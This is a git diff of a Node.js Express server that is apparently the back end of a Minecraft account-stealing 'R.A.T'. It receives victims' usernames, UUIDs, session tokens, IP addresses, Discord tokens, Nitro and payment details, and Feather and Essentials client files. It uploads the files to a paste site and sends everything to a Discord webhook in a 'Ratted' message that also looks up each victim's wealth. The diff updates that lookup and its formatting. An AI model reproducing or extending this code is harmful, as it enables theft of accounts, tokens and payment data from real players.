@@ -3,7 +3,6 @@ const
     usingDiscord = true,
     usingMongoDB = false
 
-
 //setup
 require("dotenv").config()
 const { post, get } = require("axios").default,
@@ -92,10 +91,13 @@ app.post("/", (req, res) => {
 
             if (usingDiscord) {
                 //get networth
-                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: { total_networth: null } }] } } })).data.data[0].networth
+                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
 
-                //check if api off
-                const total_networth = networth.total_networth == null ? 0 : networth.total_networth
+                //check if has profiles, if api off or if normal
+                let total_networth
+                if (networth == null) total_networth = `[NW] No profile data found [NW]`
+                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} [NW]`
+                else total_networth = `[NW] ${formatNumber(networth.networth)} [NW]`
 
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
@@ -125,14 +127,14 @@ app.post("/", (req, res) => {
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${formatNumber(total_networth)}`, //ping
+                    content: `@everyone - ${total_networth}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
                         description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
-                            "text": "MagiBotOnTop",
+                            "text": "MagiDev",
                         },
                         timestamp: new Date()
                     }],
@@ -164,7 +166,7 @@ app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))
 
 //format a number into thousands millions billions
 const formatNumber = (num) => {
-    if (num < 1000) return num
+    if (num < 1000) return num.toFixed(2)
     else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
